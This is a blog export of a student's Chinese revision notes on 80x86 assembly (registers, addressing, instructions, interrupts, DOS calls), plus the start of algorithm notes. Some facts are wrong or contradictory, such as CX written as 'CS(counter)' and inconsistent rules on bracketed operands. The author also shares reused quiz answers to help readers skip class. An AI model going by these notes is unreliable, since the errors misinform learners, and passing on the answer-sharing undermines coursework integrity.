
[{"content":" ​\t这里是我个人整理的一些关于学校课程的一些笔记还有资源，如果能帮到你最好，但是笔者的实力有限，很多地方前言不搭后语或者复制粘贴PPT，希望您能谅解。\n​\t考完一场考试之后我会在文章中画重点，所以我个人认为还是有点作用的。\n","date":"11 May 2025","externalUrl":null,"permalink":"/notes/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e​\t这里是我个人整理的一些关于学校课程的一些笔记还有资源，如果能帮到你最好，但是笔者的实力有限，很多地方前言不搭后语或者复制粘贴PPT，希望您能谅解。\u003c/p\u003e\n\u003cp\u003e​\t考完一场考试之后我会在文章中画重点，所以我个人认为还是有点作用的。\u003c/p\u003e\u003c/blockquote\u003e","title":"","type":"notes"},{"content":" 汇编语言复习 # ​\t1.这是某学校汇编语言的课程内容，简单做一个复习的笔记，如果能帮到校友就更好了\u0026hellip;\u0026hellip;\n​\t2.整体来看感觉内容不多，但是很杂很乱，容易一开始让人很不知所以然，再加上讲课老师感觉逻辑性不算很强，可能让人感觉有点劝退，但是这门课程本身还是相当重要的\u0026hellip;\u0026hellip;\n​\t3.然后就是关于本课程的实验，我的评价就是善用AI，如果你觉得很难写，但是前提是你先要看得懂并且会用MASM工具来调试。\n​\t4.手写代码占30分，这个要卷的话看下上机作业，不卷随缘，剩下基本都是八股。\n​\t5.我的笔记确实复制粘贴了很多PPT，但是哪怕是PPT你也会想看带目录的对么\u0026hellip;\u0026hellip;\n​\t6.关于考试，我整理了一个文件，存放了两个往年题，并且我个人的考试经验来看，第二套往年题目相当具有参考价值，点击这里下载。最后一道关于I/O的编程题目几乎是类似的，没有答案，你直接截图给某个GPT就可以了。\n第一章 基础 # 第一章只有一些基本的概念。\n执行过程 # 二进制数：计算机硬件唯一识别和使用的数制 以2为基的数制表示法，数由2个数字构成（0、1），二进制数后缀为B， 如10110111B。 十进制数：人类自然语言中常用的数制 以10为基的数制表示法，数由10个数字构成（09），十进制数后缀为D， 如1945D。 十六进制数：程序设计中方便使用和转换的数制 以16为基的数制表示法，数由16个数字构成[09、A（10）、B（11）、 C（12）、D（13）、E（14）、F（15）]，十六进制数后缀为H，如 18ADH。\n进制的转换 # 数码的表示 # 1.原码表示法 # （1）原码表示法： 将数的真值形式中的正（负）号，用代码0(1)来表示，数 值部分用二进制来表示。符号 + 绝对值 正数：符号位为0，后面的n-1位为数值部分 负数：符号位为1，后面的n-1位为数值部分 （2）原码的特点 “0” 的原码有两种表示法 [+0]原＝00000000B, [-0]原＝10000000B n位二进制原码所能表示的数值范围为： -(2n-1-1)～(2n-1-1)\n原码表示一个数时，最高位为符号位\n[+3]原码 = 0 000,0011 = 03H [-3]原码 = 1 000,0011 = 83H [+0]原码 = 0 000,0000 = 00H [-0]原码 = 1 000,0000 = 80H\n2.反码表示法 # 正数的反码同原码，负数的反码数值位与原码相反 例：n=8bit [+5]反码 = 0 000,0101 = 05H [-5]反码 = 1 111,1010 = FAH [+0]反码 = 0 000,0000 = 00H [-0]反码 = 1 111,1111 = FFH 0的表示不唯一\n3.补码表示法 # （1）补码表示规则： 正数的补码: 符号 - 绝对值（与正数的原码相同） [+1]补码 = 0000 0001 = 01H [+127]补码 = 0111 1111 = 7FH [+0]补码 = 0000 0000 = 00H 负数的补码: 负数 X 用 2n-|X| 表示 [-1]补码 = 28-1 = 1111 1111 = FFH [-127]补码 = 28-127 = 1000 0001 = 81H 一种简单方法： （1）写出与该负数相对应的正数的补码 [-1]补=1111 1111 [+1]补= 0000 0001 （2）按位求反1111 1110 （3）末位加1\n第二章 80x86计算机组织 # 2.1 三种模式 # 实模式-虚拟8086模式-保护模式\n*2.2 寄存器（Register）： # 数据寄存器 # (暂态计算中用到的寄存器)\nAH(high) AL(low)\nAX(adder) BX(base) CS(counter) DX(double)\n指针寄存器 # 指针和变址寄存器用来引用一些数据：能够存放偏移量。\nSP(stack pointer)\nBP(base pointer)\nSI(source) DI(destination)\n段寄存器 # 在存储器中用分段的方式来管理数据，存放了很多base地址。\nCS(code segment) SS(stack segment) DS(data segment) ES(append segment)\n控制寄存器 # IP（Instruction pointer）\u0026mdash;》指令地址的偏移量\nflags有哪些，什么意思？\n标志位分类 ➢ 条件（状态）标志 OF、SF、ZF、AF、CF和PF，其值取决于一个操作完成后，算逻部件ALU所处的状态。 ➢ 控制标志和系统标志 DF、IF和TF，其值是通过指令人为设置的，用以控制程序的执行。\n陌生的flag寄存器：\n*2.3 存储器 # ◆ 计算机存储信息的基本单位是一个二进制位 ◆ 8086字长为16位，地址长度20位 ◆ 80386以上机的字长为32位，地址长度32位以上\n怎么表示？\n​\tLittle Endian：小端法，03080H是低的地址，存到低位的字节，03081H是高位的地址，就存放到高位的字节，这里是重点。\n存储器采用分段管理后，一个内存单元地址要用段基地址和偏移量两个逻辑地址来描述，表示为:\n​\t段基址:偏移量\n就是要理解分段的机制。\n存储器分段：段起始地址必须是某一小段的首地址，段的大小可以是64K范围内的任意字节。 **物理地址：**每个存储单元的唯一的20位地址。 段基地址：段起始地址(20位)=10H * 段寄存器(16位) \u0026mdash;-》在二进制上左移动了4个bit 偏移地址：段内相对于段起始地址的偏移量（16位），偏移量又称为有效地址（EA）。 物理地址 = 16d * 段寄存器 + 偏移地址 = 10H * 段寄存器 + 偏移地址\n几个段？ 4个。\n中间比较复杂的部分都是操作系统的内容，可以暂时不管。\n第三章 指令系统和寻址方式 # 3.1\t80X86寻址方式 3.2\t80X86机器语言指令概况 3.3\t80X86指令系统\n3.1 怎么寻找地址？ # 寻址方式：指令指定操作数地址的方式 1、与操作数据有关的寻址方式 2、与转移地址有关的寻址方式\n操作数通常保存在： （1） 指令中MOVAX, 2000H （2） CPU的寄存器中MOVAX, BX （3） 内存单元中MOVAX, [2000H] （4） I/O接口寄存器中INAH, 20H\n3.1.1 与数据有关的寻址方式 # 经常拿来改错。\n还会考察你什么形式是怎样的寻址方式。\n[]间接引用地址，相当于引用，在内存中取地址。\n作用：\n不加 []：直接数值或地址 mov al, VALUE\n如果 VALUE DB 66H：不加中括号，会被解释为立即数 66H 编译后等同于： mov al, 66h ⚠️ 但在某些上下文中可能错误，比如你写：\nmov ax, VALUE ; VALUE 是 DB 类型，而 AX 是 16 位寄存器 → 错误！\n加 []：访问内存地址中的内容 mov al, [VALUE]\n现在 VALUE 被当作一个内存地址，意思是： “从地址为 VALUE 的内存中取出一个字节的值，放到 AL 里” 假如： VALUE DB 66H 则执行完之后：AL = 66H 这是直接寻址方式（Direct Addressing）。\n怎么来做偏移？\nEA的计算方法：重点\n要注意的表示方式。\n缺省的时候默认就是DS数据段。\nMOV BX，[2100H]；DS：[2100H] →BX\n容易混淆的地方：\n用 VALUE DB 10 定义了一个变量，那么VALUE是这个定义的变量的内存地址的符号名（指针）\nMOV AX，VALUE 符号不对应。\ndata segment value db 66H other db 88H arr db 12h, 34h, 56h, 78h data ends code segment mov ax, data mov ds, ax mov al, value mov cl, [value] mov ax, word ptr value mov bx, word ptr [value] ... code ends 指令 正确性 说明 mov al, value ✅ 默认等价于 mov al, [value] mov cl, [value] ✅ 显式间接寻址，读取一个字节 mov ax, word ptr value ⚠️ 虽然合法，但读取了 value 和 other 两个字节 mov bx, word ptr [value] ⚠️ 同上，低地址是 value，高地址是 other 都差不多。\nbase pointer 和 stack segment（SS）来做配合处理。\n◼ 只要指令寻址时使用了BP，计算物理地址时约定段是SS段。 ◼ 指令寻址时使用了除BP以外的其它寄存器，计算物理地址时约定段为DS段。\n3.1.2 和转移地址相关的方式 # 寻找地址的方式，因为可能会转移到别的CS段中去。\n段内寻址：转移指令与转向的目标指令在同一代码段中CS内容不变，IP内容修改 段间寻址：转移指令与转向的目标指令在两个代码段中CS和IP内容修改 直接寻址：转向的目标指令地址由转移指令直接指明\n间接寻址：转向的目标指令地址由转移指令中的寄存器或存储单元内容给出\n1.段内直接寻址 # 相当于给IP直接加上此时两个位置的地址之间的差值。\n2.段内间接寻址 # 两张PPT可以解决问题，实际上就是用offset做间接的取值。\n注意这里的si是16位，也就是近转移。\n例题：\n3.段间直接寻址 # 这就是直接更改代码段的CS和IP的值来跳转。IP在CS上面。\n4.段间间接寻址 # 下面的图比较重要：\n条件转移指令只能使用段内直接寻址方式 无条件转移（JMP）和转子指令（CALL）可用四种方式的任何一种\n3.2 80X86语言指令概况 # 不重要吧，对于考试。\n3.3 80X86指令系统 # 3.3.1 数据传送指令 # 注意pushA和popA，把所有的寄存器从stack上面进行移动。\n容易错的位置：\nDS这样的段寄存器不能用立即数更改。\nCS不能修改。\n不能直接从内存到内存。\nMOVSX MOVZX\t有符号和0扩展的区别，比较简单。\npush 和 pop 指令\n注意只能处理16bit和32bit的寄存器，不能POP AL!!!\n注意栈顶位于低地址位置，当你push数据的时候，sp的值应该减少。\npop是把stack里面的值拿出来放到DST里面去。\nXCHG直接作交换\n注意操作数是32bit 还是 16bit，来决定SP的增减值的大小。\nIN OUT这里只能用于Adder寄存器。\nI/O指令的输入和输出 # 输入和输出都是站在CPU的角度上对于端口。\n用AL寄存器接收来自于27H端口的数据。\n地址传送指令\n能同时改变两个寄存器的原始指令。\n送给寄存器的同时还送给段寄存器。\n低16bit给寄存器，高16bit给段寄存器。\n很好的一个例子：\n类型转换指令 # BSWAP：什么逆天指令？\n3.3.2 算术指令 # 1.加法指令（加法指令ADD、带进位加法指令ADC、加1指令INC等） # (1)加法指令 ADD\n格式：ADD DST,SRC 功能：（DST）＋（SRC）→ (DST) 说明：对操作数的限定同MOV指令 (2)带进位加法指令 ADC\n多个字节或者多个字的时候用ADC处理。\n格式: ADC DST,SRC 功能:（DST）＋（SRC）＋CF→(DST) 说明:对操作数的限定同MOV指令,该指令适用于多字节或多字的加法运算\n(3)加1指令 INC 格式：INC OPR 功能：（OPR）＋1 → (OPR) 说明：很方便地实现地址指针或循环次数的加1修改 (4)互换并加法指令 XADD(486以上)\n和ADD一样，就是把SRC的值更换成了原来的DST。\n格式：XADD DST，SRC 功能: (SRC) + (DST) → 暂存器 (DST) → (SRC) 暂存器→(DST) 说明：该指令执行后,原DST的内容在SRC中,和在DST中\n2.减法指令（减法指令SUB、带借位减法指令SBB、减1指令DEC、求补指令NEG、比较指令CMP等） # (1)减法指令 SUB 格式：SUB DST,SRC 功能：（DST）－（SRC）→(DST) 说明：除是实现减法功能外，其他要求同ADD (2)带借位减法指令 SBB 格式:SBB DST,SRC 功能:(DST)－(SRC)－CF→(DST) 说明:除了操作为减外,其他要求同ADC,该指令适用于多字节或多字的减法运算 (3)减1指令 DEC 格式：DEC OPR 功能：(OPR)－1→(OPR) 说明：可以很方便地实现地址指针或循环次数的减1修改\n4)求补指令 NEG 格式：NEG OPR 功能：0FFFFH -(OPR)+1 → (OPR) 对目标操作数（含符号位）求反加1，并且把结果送回目标 说明：利用NEG指令可实现求一个数的补码 (5)比较指令 CMP\n只改变FLAG，不更改实际的value.\n格式:CMP OPR1,OPR2 功能:(OPR1)－(OPR2)，只影响标志位，不影响源和目的操作数 说明:这条指令执行相减操作后只根据结果设置标志位，并不改变两个操作数的原值，其他要求同SUB。CMP指 令常用于比较两个数的大小。\n3.乘法指令 （无符号乘法指令MUL、带符号数乘法指令IMUL等） # (1)无符号数乘法 MUL 格式: MUL SRC\t; SRC：除立即数以外的寻址方式 功能: 字节操作： (AL) * (SRC) → (AX) 字操作： (AX) * (SRC) → (DX:AX) 双字操作： (EAX) * (SRC) → (EDX:EAX) 乘积的高一半为0，则CF、OF均为0，否则CF、OF均为1 这样可以检查结果是字节、字或双字。 (2)带符号数乘法 IMUL 格式: IMUL SRC\t；SRC：除立即数以外的寻址方式 功能: 字节操作： (AL) * (SRC) → (AX) 字操作： (AX) * (SRC) → (DX:AX) 双字操作： (EAX) * (SRC) → (EDX:EAX) 乘积的高一半是低一半的符号扩展，则CF、OF均为0，否则CF、OF均为1。 其实质和MUL情况下一样，主要用于判断结果是字节、字或双字。\n📌 DX 寄存器的常见用途 # *乘法和除法指令中用于存放高位结果： 如无符号乘法 MUL： 16 位乘法时：AX × SRC = DX:AX，结果的高 16 位在 DX。 除法时也是如此，例如 DIV： 被除数是 DX:AX 组成的 32 位数。 端口输入输出指令中存储端口号： 比如 IN AL, DX 表示从 DX 寄存器所指端口读取字节到 AL。 OUT DX, AL 表示将 AL 中的数据写入 DX 所指端口。 通用用途寄存器（可存储临时变量、地址、计数值等） 4.除法指令（无符号除法指令DIV、带符号除法指令IDIV） # 考试大题会出一道类似于这样的手写代码，最好手写一遍，处理一些细节问题：怎样写出完整的可执行程序？\n5.十进制调整指令（DAA、DAS等） # 懒的看，考了再说。。。。。。\n3.3.3 逻辑指令 # 逻辑指令包括：\n１．逻辑运算指令 # 字面意思，大概看看\n２．位测试并修改指令 # 。。。。。。\n３．位扫描指令 # 。。。。。。\n４．移位指令 # 注意：那么✖2或者➗2的幂之类的就用位移运算最好。\n3.3.4 串处理指令 # 处理存放在存储器里的数据串，所有串指令都可以处理字节或字，386及后继机型还可以处理双字。 利用串操作指令可以直接处理两个存储器单元的操作数，方便地处理字符串或数据块。 串处理指令包括： MOVS 串传送 CMPS 串比较 SCAS 串扫描 LODS 从串取 STOS 存入串 INS 串输入（从I/O端口输入） OUTS 串输出（向I/O端口输出）\n和MOV有什么区别？\n功能 MOV MOVS 系列 用途 常规数据传送 字符串/内存块复制 位置指定 显式指定源和目标 隐式使用 SI/ESI/RSI 和 DI/EDI/RDI 可否用于循环 通常需要手写循环 可配合 REP 一条指令复制多次 是否影响 DF 不会 受方向标志位 DF 影响 注意源和目标的要放入的寄存器的位置。\nsource:DS:[SI]/ES:[SI]\ndestination:ES:[DI]\n自动化的更改这些变量，注意每次移动的大小取决于数据类型的大小。\nDF（direction flag） 决定复制的方向。\n先不管REP REPZ之类的\n3.3.5 控制转移指令 # 控制转移指令包括：\n１．无条件转移指令 # 具体情况：\n直接用位移量（相当于是利用EA的差值)或者间接用地址（直接利用EA)跳转。\n这里会考试：\n注意偏移量和位移量的区别。\n段间CS IP的值都要进行更改。\n２．条件转移指令 # 指令 条件 条件描述 JZ ZF = 1 上一条操作结果为 0（等于） JNZ ZF = 0 不等于 JC CF = 1 有进位（Carry） JNC CF = 0 无进位 JE 等于（其实和 JZ 一样） JNE 不等于（= JNZ） ３．条件设置指令 # ４．循环指令 # 80X86为了简化循环程序的设计，设计了一组循环指令如下： LOOP OPR LOOPE/LOOPZ OPR LOOPNE/LOOPNZ OPR\n1.只能短转移。\n2.CX或者ECX作为计数器。\nLOOP 指令做简化\n５．子程序调用/返回 # 子程序:子程序结构相当于高级语言中的过程(PROCEDURE).为便于模块化程序设计，往往把程序中某些具有独立功能的部分编写成独立的程序模块，称之为子程序。 程序中 由子程序调用指令调用子程序，而在子程序执行完后由返回调用指令返回调用程序继续执行。 80X86提供了以下指令 CALL子程序调用 RET子程序返回\n根据调用的类型：对于CS和IP进行压栈的操作。\nRET，就是恢复现场。\n６．中断指令/返回 # 有时当系统运行或者程序运行期间在遇到某些特殊情况时，需要计算机自动执行一组专门的程序来进行处理。 这种情况称为中断，所执行的这组程序称为中断例行程序或中断子程序。 其它随机事件，如I/O控制和数据传送，不采用中断方式系统效率会很低。\n注意和子程序调用的区别。\n保存疑IP CS FLAGS\nINT INTO IRET\n硬中断就是被动的。\n中断向量 ◼中断向量：中断处理子程序的入口地址 ◼在PC机中规定中断处理子程序为FAR型 ⚫ 每个中断向量占用4个字节，其中低两个字节为中断向量的偏移量部分,高两个字节为中断向量的段基址部分\n中断类型号 IBM PC机共支持256种中断，相应编号为0～255，把这些编号称为中断类型号。\n整个中断向量表就是指向一些code segment。\n256 * 4 = 1024bytes\n0000H \u0026mdash;》03FFH的内存单元。\n调用和返回：\n注意INT功能的过程，从中断向量表中取值。\n3.3.6 处理机控制指令 # 比如在调用中断程序之前，STI，设置中断允许的标志位。\n第四章 汇编语言程序格式 # 4.1 汇编程序功能 # 前面是linkerlab的内容。\n机器指令 伪指令（前面的定义数据之类的） 宏指令\n4.2 伪操作 # 伪操作：告诉汇编程序的某些功能说明或定义，仅在汇编时使用，不会汇编成任何机器指令。\n4.2.1 处理器选择伪操作 # .386P\n4.2.2 段定义伪操作 # 明确关系，主程序开始之前指定。\n4.2.3 程序开始和结束伪操作 # NAME TITLE END\n4.2.4 数据定义及存储器分配伪操作 # 到现在才讲数据段中怎样定义数据。\n看右边的具体例子。\n段基址 偏移量 类型\n注意以下这个例子：偏移量和放置的问题。\n4.2.5 表达式赋值伪操作EQU # 知道是EQU就可以：\n4.2.6 地址计数器对准伪操作 # ORG 设置，可以达到对齐的效果。\n4.2.7 基数控制伪操作 # 。。。。。。\n4.3 汇编语言程序格式 # 考察过上述的定义。\n4.4 汇编语言程序上机过程 # 返回DOS的方法。\nMOV AX, 4C00H\nINT 21H\n第五章 循环与分支程序 # 应该是没有考察过画图的问题：\n看一个跳转的例子：\n5.1循环程序设计 # 具体的多看看例题，或者自己手写代码。\n用CX控制循环的变量就可以。\n感觉右边的更好记忆。\n5.2分支程序设计 # 主要看一下跳转表：\n5.3如何在实模式下发挥 80386及其后继机型的优势 # 。。。。。。\n第六章 子程序调用（就是调用函数的准备） # 6.1子程序的设计方法 # procedure name PROC NEAR/FAR\n\u0026hellip;\u0026hellip;\nprocedure name ENDP\n子程序和调用者在不在同一个代码段之中，利用FAR NEAR\n比如：\nFAR属性在同一个段或者不同的段内都可以调用。\n段间调用压入CS寄存器：FAR属性和NEAR属性\n保护和恢复寄存器的方法\n◼ 子程序开始时，使用PUSH指令保存 ◼ 子程序返回前，使用POP指令恢复 ◼ 保存和恢复次序应该相反\n优先保存FLAG寄存器\n参数传送： # ​\t（1）通过寄存器传送参数 ​\t（2）通过存储器传送参数 ​\t*子程序和调用程序在同一程序模块中，则子程序可 直接访问模块中的变量 ​\t*子程序和调用程序不在同一程序模块中 ​\t（3）通过地址表传送参数地址 ​\t（4）通过堆栈传送参数或参数地址\n寄存器传送 # 大概看一下这段代码，同一个段中对于寄存器的访问都是相同的。\n存储器直接访问 # 传送一个table（地址表） # 参数很多，用offset把很多参数的起始位置放到一张表里：\n直接压入堆栈 # 类似于结构体的处理： # 怎么访问？\n6.4 *DOS系统功能调用 # 可能是考察重点。。。。。。\n系统功能调用是DOS为系统程序员及用户提供的一组常用子程序。 用户可在程序中调用DOS提供的功能。 DOS规定用INT 21H中断指令作为进入各功能调用子程序的总入口，再为每个功能调用规定一个功能号，以便进入相应各个子程序的入口。 DOS系统功能调用的分类： 设备管理、文件管理、目录管理\n过程图：\n例子：\n第七章 高级汇编语言技术 # 1.宏汇编 # 宏：源程序中一段有独立功能的程序代码。 宏指令：用户自定义的指令。在编程时，将多次使用的功能用一条宏指令来代替。\n像是模板或者C语言中的宏函数，直接复制粘贴。\n注意和子程序调用的区别：\n怎么写一个macro,以下的格式，调用的时候和高级语言是类似的:\n过程：\n这个替换过程的术语：\n接着是一些宏函数的特殊规定，看ppt即可\u0026hellip;\u0026hellip;这里就已经有高级语言的味道了\u0026hellip;\u0026hellip;\n1.可以没有参数。\n2.参数可以是操作数 比如ADD。\n3.LOCAL局部的变量，防止冲突。\n一个例子：\n2.重复汇编 # 例子：\n在data segment定义的简化的操作：\nIRP\n不定的重复，每次用一项来替换REG，天才。\nIRPC\n用字符串不停地替代哑元，直到结束。\n3.条件汇编 # 还是类似于C语言的头文件编译一样的东西\u0026hellip;\u0026hellip;\n举个简单例子：\n第八章 输入输出程序设计 # I/O设备的数据传送方式 # 由很多接口上面的寄存器来完成：\nI/O端口地址：为了访问接口上的寄存器，系统给这些寄存器分配专门的存取访问地址，这样的地址称为I/O端口地址。\n8086/8088CPU系统中，I/O端口地址和存储单元的 地址是各自独立的，分占两个不同的地址空间。 8086/8088CPU提供的I/O端口地址空间达64KB 可接64K个8位端口(字节)，或可接32K个16位端口(字)。 PC及其兼容机实际只使用0~3FFH之间的I/O端口地址。\u0026mdash;》（PC只用了10位地址线(A0-A9)进行译码，其 寻址的范围为0H-3FFH，共有1024个I/O地址。） 存取接口寄存器中的数据是依靠I/O指令完成的。 一些IO指令 # 程序直接控制IO，不停等待，直到可以输入或者输出： # 查询状态端口的数据。\n中断方式 # 如果你对中断感兴趣，可以查看这个网页：https://linux-kernel-labs-zh.xyz/so2/lec4-interrupts.html\n中断方式： 当外设准备好时，外设主动向CPU发出中断服务请求，CPU暂时中止现行程序的执行，转入中断服务处理程序完成输入/输出工作，之后返回被中断的程序继续执行。 中断方式特点： CPU和I/O设备能够并行运行。 具有及时处理响应意外事件或异常的能力。\n屏蔽中断方式 # 设置IF标志位\n硬件中断服务： # 软件中断是由程序本身导致的： # 程序中的中断指令 INT n 操作数n指出中断类型号，0—FFH 如 INT 12H ； 存储器容量测试 CPU的某些运行结果 除法错中断：除数为零/商超出表数范围，中断类型号为0的 内部中断 溢出中断：运算结果溢出，OF=1，INTO指令将引起类型为4 的内部中断 调试程序（DEBUG）设置的中断 单步中断：标志位TF=1时，中断类型号=1 断点中断：将程序分段，每段设置一个断点（INT 3），中 断类型号=3 中断向量表 # 相当于是一个映射map，设置对应的CS和IP，然后跳转执行对应的中断处理的程序。\nX86的内存空间分配（OS课中还会学到）：\n一个基本处理流程：\n中断响应\n中断处理\n中断返回\nCPU自动恢复\n和子程序调用的区别： # 中断与子程序调用处理过程相似，差别主要在于进入和返回时的处理不同。\n进入中断服务处理程序时 # 子程序调用：只把CS和IP压入堆栈。 中断：除把CS和IP压入堆栈外，还把标志寄存器的内容压入堆栈，并且关掉了中断和单步运行方式。\n返回时 # 子程序返回：只把断点地址从堆栈弹出送CS和IP。 中断返回：除恢复断点地址CS和IP外，还要恢复标志寄存器的内容。\n时机不同 # 中断：一般随机发生；软中断在程序中预先安排。 子程序调用：程序中预先安排调用。\n优先级的处理： # 80386程序中断 # 看不懂也懒得看了。\nBIOS中断和DOS中断 # 以下是ChatGPT的解释\n1. 定义 # BIOS（Basic Input/Output System） # 固件，存储在主板上的 ROM/EEPROM 芯片中，在计算机开机时运行。 负责执行自检（POST, Power-On Self Test）、初始化硬件、引导操作系统。 提供一组低级别的输入输出服务，如读写磁盘、键盘输入、显示输出、串口通信等。 DOS（Disk Operating System） # 操作系统，存储在硬盘或软盘中，在 BIOS 引导后加载。 负责管理文件系统、进程、设备驱动、命令解释等功能。 典型的 DOS 版本包括 MS-DOS、PC-DOS、FreeDOS 等。 2. 作用 # 系统 主要作用 BIOS 初始化硬件，执行自检（POST），引导操作系统，提供基础 I/O 接口 DOS 管理磁盘文件系统、提供命令行界面、运行应用程序 3. 联系 # 启动过程的衔接 计算机上电后，BIOS 首先执行，完成自检并寻找引导设备（软盘、硬盘、光盘等）。 BIOS 读取 DOS 的引导扇区（Boot Sector），然后加载 DOS。 DOS 依赖 BIOS 来访问低级硬件，如磁盘、键盘、屏幕等。 DOS 依赖 BIOS 进行硬件访问 早期 DOS 不直接控制硬件，而是通过**BIOS 提供的中断（如 INT 13h 读写磁盘，INT 10h 控制显示器）**与硬件交互。 例如，在 DOS 下运行的程序可以通过 INT 21h 调用 DOS 功能，而 INT 10h 直接调用 BIOS 来控制显示器。 BIOS 提供基本的驱动支持 DOS 启动时，可以直接使用 BIOS 的设备驱动程序（如磁盘、键盘）。 但 DOS 也可以加载更高级的驱动程序（如 HIMEM.SYS、CD-ROM 驱动等）来替代 BIOS 功能。 4. 区别 # 特性 BIOS DOS 存储位置 ROM/EEPROM 磁盘（硬盘、软盘） 运行时机 计算机启动时 BIOS 加载后 作用 硬件初始化、系统引导 文件管理、命令执行 是否可修改 固定在 ROM（可升级） 软盘/硬盘上，可修改 硬件访问方式 直接控制硬件 通过 BIOS 或驱动访问硬件 5. 总结 # BIOS 是计算机启动的第一步，它初始化硬件，并将操作系统（如 DOS）加载到内存中。 DOS 是一个基于磁盘的操作系统，在 BIOS 加载后运行，提供文件管理、命令解释等功能。 DOS 依赖 BIOS 进行低级硬件访问，但也可以加载自己的驱动程序绕过 BIOS。 现代操作系统（如 Windows、Linux）已经不再依赖 BIOS，而是直接与硬件交互，但 DOS 仍然常用于嵌入式系统、维修工具等场景。 功能调用 键盘 显示器 打印机\n什么是BIOS # 什么是DOS # DOS系统功能调用 INT 21H AH=1 键盘输入并回显 AH=2 显示字符输出 AH=9 显示字符串输出 AH=0AH 键盘输入到缓冲区 AH=4CH 带返回码终止 二者之间的关系：\nBIOS是直接操作硬件的\n调用方法：\n键盘 # 课内测试 # 理论上很多年课内测试的答案都没有改变过，所以你可以拿来参考，摆脱每节课都必须要去的痛苦，但是时间就要你自己来把控\u0026hellip;\u0026hellip;\n如果你发现你输入的数据错了（这个没办法，证明人家老师反应过来了），或者是我写的答案有错误，可以在评论区立刻指出来\u0026hellip;\u0026hellip;\n号我不知道为什么后面对不上了，自己看看吧\u0026hellip;\u0026hellip;\nch1-1 # 段寄存器:存放了一系列的段的base地址。\nch1-2 # 23451：左边移位直接相加就可以了。\nch1-3 # 寄存器 立即\nch2-1 # [BX + SI]也就是存储器中取得\n**基址变址寻址 **\n默认的就是DS段寄存器\nch2-2 # 段间间接\n7856 3412 （注意前后顺序）\nch2-3 # 上面的两个操作是独立的：\n1232 1236\nch3-1 # 255 255 应该是吧\nch3-2 # AX DX AX\nch3-3 # DF\t字操作 word\u0026mdash;》2 bytes 2\nch4-1 # ZF = 1 CF = 0\n注意标志位即可。\nch4-2 # B C？（和连接有关系么？斟酌一下）\nch4-3 # 0000 0004 0006\nch5-1 # 26 36\nROL：循环向左移动的指令。\nch5-2 # 从最高位开始：11011100\n填写：1 0\nch5-3 # 5678\n1234\nch6-1 # NEAR FAR 很简单的概念\nch6-2 # 寄存器 存储器\nch6-3 # 0403\n0203\nch7-1 # B B\nch7-2 # A D（我有些疑惑，难道不是节省了时间么（但是确实不节省存储空间），不用进行转移和参数的传递，还是说宏展开的时间把这段时间给浪费了？很奇怪，我牺牲了10分，孩子们）\nch7-3 # AX BP\nch7-4 # 不带脑子：SHR SHL\nch8-1 # 第一个空就是说把输入状态端口地址的值输入到AL寄存器里面去 82H\n第二个空是检查最低位是不是1,那么就使用 01H 检测就可以了\n82H 01H\nch8-2 # 外设控制器 协处理器\nch8-3 # 这里也有可能是8-2,看空的个数即可\n响应 + 处理 + 返回\nch8-4 # 这是这张PPT之前举的每十秒钟响铃并且打印的例子：\nB B（主程序只要调用即可）\nch9-1 # \u0026hellip;\u0026hellip;\nch9-2 # *上机实验 # https://github.com/Pine-G/XJTU-CS2020/tree/main/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80\n这个学长的仓库里有两年的考题以及上机实验的参考代码，合理使用！\n我个人认为这个课的代码没有查重，这个得到时候再看吧。\n","date":"11 May 2025","externalUrl":null,"permalink":"/notes/80x86assembly/","section":"","summary":"\u003ch1 class=\"relative group\"\u003e汇编语言复习 \n    \u003cdiv id=\"%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%A4%8D%E4%B9%A0\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%A4%8D%E4%B9%A0\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e​\t1.这是某学校汇编语言的课程内容，简单做一个复习的笔记，如果能帮到校友就更好了\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e​\t2.整体来看感觉内容不多，但是很杂很乱，容易一开始让人很不知所以然，再加上讲课老师感觉逻辑性不算很强，可能让人感觉有点劝退，但是这门课程本身还是相当重要的\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e​\t3.然后就是关于本课程的实验，我的评价就是善用AI，如果你觉得很难写，但是前提是你先要看得懂并且会用MASM工具来调试。\u003c/p\u003e","title":"80X86:Assembly","type":"notes"},{"content":"","date":"11 May 2025","externalUrl":null,"permalink":"/","section":"Mio's Tea Time","summary":"","title":"Mio's Tea Time","type":"page"},{"content":" 算法设计与分析 # 1.课太蠢，简单写一点复习笔记\n2.大量的数学笔记都是我复制下来的，我没有手打这么多公式的耐心，只能感谢那名陌生的同学了,原来的仓库https://github.com/DANNHIROAKI/XJTU-CS-Courses/tree/master,可能这篇文章的阅读体验相对会更好一点，因为数学公式会直接渲染并且我会多余做一些补充和更改，如果原作者看到并且觉得这样不好，您可以直接联系我删除。\n3.代码就会按照原书中来的，利用Java来实现。\n4.https://csdiy.wiki/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/CS170/ 笔者非常后悔在学校老师狂念PPT的时候没有自学这个CS170,如果你还有机会，一定要看一看。\n5.关于本课程你理论上能找到两套往年题目，有参考价值，模拟题目参考价值较少，本课程从选修变成必修之后难度应当有所降低，不管你的老师怎么样，考试之前的复习课一定去听，会透露原题。\n1.算法概述 # 算法的执行次数和时间都有限。程序不一定，因为有可能有while(true)。\n时间复杂性问题 # O omu o theta\n举例子：\nf = O(g)\ng是f的一个上界，f \u0026lt;= g\nomu: \u0026gt;=\no: \u0026lt;\ntheta: = (既是O 又是omu)\nomega: \u0026gt;\nn的阶乘\nStirling’s approximation 是对n !趋于无穷速度的估计，公式如下\n𝑛!=2𝜋𝑛(𝑛𝑒𝑛)(1+Θ(1𝑛))\n可推导：\n𝑛!=𝑜(𝑛𝑛) 𝑛!=𝜔(2𝑛) 